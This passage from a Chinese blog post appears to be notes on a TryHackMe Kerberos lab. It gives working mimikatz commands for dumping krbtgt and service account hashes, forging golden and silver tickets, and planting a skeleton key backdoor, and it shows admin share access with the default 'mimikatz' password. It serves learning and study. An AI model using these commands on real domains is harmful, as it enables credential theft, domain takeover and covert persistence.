<h5 id="金-x2F-银票攻击概述"><a href="#金-x2F-银票攻击概述" class="headerlink" title="金&#x2F;银票攻击概述"></a>金&#x2F;银票攻击概述</h5><p>黄金票据攻击通过转储域上任何用户的票据授予票据来工作，这最好是域管理员，但是对于黄金票据，您将转储 krbtgt 票据，对于白银票据，您将转储任何服务或域管理员票。这将为您提供服务&#x2F;域管理员帐户的 SID 或安全标识符，该标识符是每个用户帐户的唯一标识符，以及 NTLM 哈希。然后，您在 mimikatz 黄金票据攻击中使用这些详细信息，以创建一个模拟给定服务帐户信息的 TGT。<br><img src="https://s2.loli.net/2022/06/06/9ZFf4dRvqGc2Cj1.png"></p>
<h5 id="转储-krbtgt-哈希"><a href="#转储-krbtgt-哈希" class="headerlink" title="转储 krbtgt 哈希"></a>转储 krbtgt 哈希</h5><p><code>privilege::debug</code> - 确保此输出 [权限 ‘20’ ok]<br><code>lsadump::lsa /inject /name:krbtgt</code> </p>
<ul>
<li><p>这将转储散列以及创建金票所需的安全标识符。要创建银票，您需要更改 &#x2F;name: 以转储域管理员帐户或服务帐户（如 SQLService 帐户）的哈希值。<br><code>lsadump::lsa /inject /name:SQLService</code><br><code>lsadump::lsa /inject /name:Administrator</code></p>
<h5 id="创建金-x2F-银票据"><a href="#创建金-x2F-银票据" class="headerlink" title="创建金&#x2F;银票据"></a>创建金&#x2F;银票据</h5><p><code>Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:</code></p>
</li>
<li><p>这是创建金票创建银票的命令，只需将服务 NTLM 哈希放入 krbtgt 槽，将服务帐户的 sid 放入 sid，并将 id 更改为 1103。</p>
</li>
</ul>
<p><code>Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt: 72cd714611b64cd4d5550cd2759db3f6 /id:1103</code><br><img src="https://s2.loli.net/2022/06/06/eS3DvAEisf589UN.png"><br>银票据<br><code>kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt</code><br>把sid 填 sid , rce4填ntlmhash  用户名随意<br><code>kerberos::golden /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /target: controller.local /rc4:2777b7fec870e04dda00cd7260f7bee6 /user:Administrator /ptt</code></p>
<h5 id="使用金-x2F-银票据访问其他机器"><a href="#使用金-x2F-银票据访问其他机器" class="headerlink" title="使用金&#x2F;银票据访问其他机器"></a>使用金&#x2F;银票据访问其他机器</h5><p>1、<br><code>misc::cmd</code><br>这将使用 mimikatz 中的给定票证打开一个新的提升命令提示符。<br>2、<br>访问您想要的机器，您可以访问的内容取决于您决定从中取票的用户的权限，但是如果您从 krbtgt 取票，则您可以访问整个网络，因此称为黄金票；但是，银票只能访问用户可以访问的那些，如果它是域管理员，它几乎可以访问整个网络，但是它比金票稍微低一些。<br><code>dir \\DESKTOP-1\c$</code><br><img src="https://s2.loli.net/2022/06/06/HNGQv4Ft2s6RgOP.png"><br>如果没有域中的其他计算机，此攻击将无法运行，但是我挑战您在自己的网络上配置它并尝试这些攻击。</p>
<h4 id="mimikatz-的-Kerberos-后门"><a href="#mimikatz-的-Kerberos-后门" class="headerlink" title="mimikatz 的 Kerberos 后门"></a>mimikatz 的 Kerberos 后门</h4><p>除了使用金票和银票保持访问权限外，mimikatz 在攻击 Kerberos 时还有另一个技巧。与金票和银票攻击不同，Kerberos 后门更加微妙，因为它的行为类似于 rootkit，将自身植入域林的内存中，允许自己使用主密码访问任何机器。 </p>
<p>Kerberos 后门通过植入一个滥用 AS-REQ 验证加密时间戳的方式的万能密钥来工作。万能密钥只能使用 Kerberos RC4 加密。 </p>
<p>mimikatz 万能密钥的默认哈希值是 _60BA4FCADC466C7A033C178194C03DF6_，这使得密码 -“ <em>mimikatz</em> ”</p>
<p>这只是一个概述部分，不需要您在机器上做任何事情，但是我鼓励您继续自己并添加其他机器并使用带有 mimikatz 的万能键进行测试。</p>
<h5 id="万能钥匙概述"><a href="#万能钥匙概述" class="headerlink" title="万能钥匙概述"></a>万能钥匙概述</h5><p>如上所述，万能密钥通过滥用 AS-REQ 加密时间戳来工作，时间戳是使用用户 NT 哈希加密的。然后域控制器尝试使用用户 NT 散列解密此时间戳，一旦植入了万能密钥，域控制器就会尝试使用用户 NT 哈希和 万能密钥 NT 哈希来解密时间戳，从而允许您访问域林。<br><code>privilege::debug</code><br><img src="https://s2.loli.net/2022/06/06/P6ZRhHpYmrsNDeV.png"></p>
<h5 id="使用-mimikatz-安装万能钥匙"><a href="#使用-mimikatz-安装万能钥匙" class="headerlink" title="使用 mimikatz 安装万能钥匙"></a>使用 mimikatz 安装万能钥匙</h5><p><code>misc::skeleton</code><br><img src="https://s2.loli.net/2022/06/06/pKT4UaqvGS8wObm.png"><br>进入森林<br>默认凭据将是：“ <em>mimikatz</em> ”  </p>
<p>示例：<code>net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz</code> - 现在无需管理员密码即可访问共享</p>
<p>示例：<code>dir \\Desktop-1\c$ /user:Machine1 mimikatz</code> - 在不知道哪些用户可以访问 Desktop-1 的情况下访问 Desktop-1 的目录</p>
<p>万能钥匙不会自行持久化，因为它在内存中运行，它可以使用其他工具和技术编写脚本或持久化，</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/Tryhackme/" rel="tag"># Tryhackme</a>
              <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/06/06/Active-Directory/" rel="prev" title="Active-Directory">
      <i class="fa fa-chevron-left"></i> Active-Directory
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFKerberos%EF%BC%9F"><span class="nav-number">1.1.</span> <span class="nav-text">什么是Kerberos？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%9C%AF%E8%AF%AD"><span class="nav-number">1.2.</span> <span class="nav-text">常用术语</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%9A%84%E5%B8%A6%E9%A2%84%E8%AE%A4%E8%AF%81%E7%9A%84AS-REQ"><span class="nav-number">1.3.</span> <span class="nav-text">详细的带预认证的AS-REQ</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#TGT%E5%86%85%E5%AE%B9"><span class="nav-number">1.4.</span> <span class="nav-text">TGT内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%8D%95%E5%86%85%E5%AE%B9"><span class="nav-number">1.5.</span> <span class="nav-text">服务单内容</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Kerberos-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%A6%82%E8%BF%B0"><span class="nav-number">1.6.</span> <span class="nav-text">Kerberos 身份验证概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Kerberos-%E7%A5%A8%E8%AF%81%E6%A6%82%E8%A7%88"><span class="nav-number">1.7.</span> <span class="nav-text">Kerberos 票证概览</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9D%83%E9%99%90%E8%A6%81%E6%B1%82"><span class="nav-number">1.8.</span> <span class="nav-text">攻击权限要求</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Kerbrute%E7%9A%84%E6%9E%9A%E4%B8%BE"><span class="nav-number">2.</span> <span class="nav-text">Kerbrute的枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%BB%A5%E7%94%A8%E9%A2%84%E8%AE%A4%E8%AF%81%E6%A6%82%E8%BF%B0"><span class="nav-number">2.1.</span> <span class="nav-text">滥用预认证概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Kerbrute-%E6%9E%9A%E4%B8%BE%E7%94%A8%E6%88%B7"><span class="nav-number">2.2.</span> <span class="nav-text">使用Kerbrute 枚举用户</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Rubeus-%E7%9A%84%E6%94%B6%E8%8E%B7%E5%92%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E9%97%A8%E7%A5%A8"><span class="nav-number">3.</span> <span class="nav-text">Rubeus 的收获和暴力破解门票</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%A8Rubeus%E6%94%B6%E8%8E%B7%E9%97%A8%E7%A5%A8"><span class="nav-number">3.1.</span> <span class="nav-text">用Rubeus收获门票</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-Rubeus-%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3-x2F-%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="nav-number">3.2.</span> <span class="nav-text">使用 Rubeus 进行暴力破解&#x2F;密码喷洒</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Rubeus-%E5%92%8C-Impacket-%E7%9A%84-Kerberoasting"><span class="nav-number">3.3.</span> <span class="nav-text">Rubeus 和 Impacket 的 Kerberoasting</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%B3%95%E4%BA%8CImpacket"><span class="nav-number">3.4.</span> <span class="nav-text">法二Impacket</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Impacket-%E7%9A%84-Kerberoasting"><span class="nav-number">3.5.</span> <span class="nav-text">Impacket 的 Kerberoasting</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#AS-REP-%E7%83%98%E7%83%A4%E4%B8%8E-Rubeus"><span class="nav-number">4.</span> <span class="nav-text">AS-REP 烘烤与 Rubeus</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#AS-REP-%E7%83%98%E7%84%99%E6%A6%82%E8%BF%B0"><span class="nav-number">4.1.</span> <span class="nav-text">AS-REP 烘焙概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Rubeus-%E8%BD%AC%E5%82%A8-KRBASREP5-%E5%93%88%E5%B8%8C"><span class="nav-number">4.2.</span> <span class="nav-text">使用Rubeus 转储 KRBASREP5 哈希</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8mimikatz%E4%BC%A0%E9%80%92%E7%A5%A8%E8%AF%81"><span class="nav-number">5.</span> <span class="nav-text">使用mimikatz传递票证</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E7%A5%A8%E6%A6%82%E8%A7%88"><span class="nav-number">5.1.</span> <span class="nav-text">通票概览</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%87%86%E5%A4%87-Mimikatz-amp-Dump-%E9%97%A8%E7%A5%A8"><span class="nav-number">5.2.</span> <span class="nav-text">准备 Mimikatz &amp; Dump 门票</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.</span> <span class="nav-text">使用票据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%A5%A8%E8%AF%81%E7%BC%93%E8%A7%A3"><span class="nav-number">6.1.</span> <span class="nav-text">通过票证缓解</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz%E7%9A%84%E9%87%91-x2F-%E9%93%B6%E7%A5%A8%E6%94%BB%E5%87%BB"><span class="nav-number">7.</span> <span class="nav-text">mimikatz的金&#x2F;银票攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#KRBTGT-%E6%A6%82%E8%BF%B0"><span class="nav-number">7.1.</span> <span class="nav-text">KRBTGT 概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%87%91-x2F-%E9%93%B6%E7%A5%A8%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0"><span class="nav-number">7.2.</span> <span class="nav-text">金&#x2F;银票攻击概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BD%AC%E5%82%A8-krbtgt-%E5%93%88%E5%B8%8C"><span class="nav-number">7.3.</span> <span class="nav-text">转储 krbtgt 哈希</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E9%87%91-x2F-%E9%93%B6%E7%A5%A8%E6%8D%AE"><span class="nav-number">7.4.</span> <span class="nav-text">创建金&#x2F;银票据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E9%87%91-x2F-%E9%93%B6%E7%A5%A8%E6%8D%AE%E8%AE%BF%E9%97%AE%E5%85%B6%E4%BB%96%E6%9C%BA%E5%99%A8"><span class="nav-number">7.5.</span> <span class="nav-text">使用金&#x2F;银票据访问其他机器</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mimikatz-%E7%9A%84-Kerberos-%E5%90%8E%E9%97%A8"><span class="nav-number">8.</span> <span class="nav-text">mimikatz 的 Kerberos 后门</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99%E6%A6%82%E8%BF%B0"><span class="nav-number">8.1.</span> <span class="nav-text">万能钥匙概述</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-mimikatz-%E5%AE%89%E8%A3%85%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99"><span class="nav-number">8.2.</span> <span class="nav-text">使用 mimikatz 安装万能钥匙</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Lu1i丶"
      src="/images/1.PNG">
  <p class="site-author-name" itemprop="name">Lu1i丶</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">34</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">14</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://txluck.github.io/" title="https:&#x2F;&#x2F;txluck.github.io&#x2F;" rel="noopener" target="_blank">永安寺</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Lu1i丶</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '2IjWrTCGWIUFwAsamIh2ezIu-gzGzoHsz',
      appKey     : 'EOJr4RJE5lM0E3ryx1vGuAPV',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
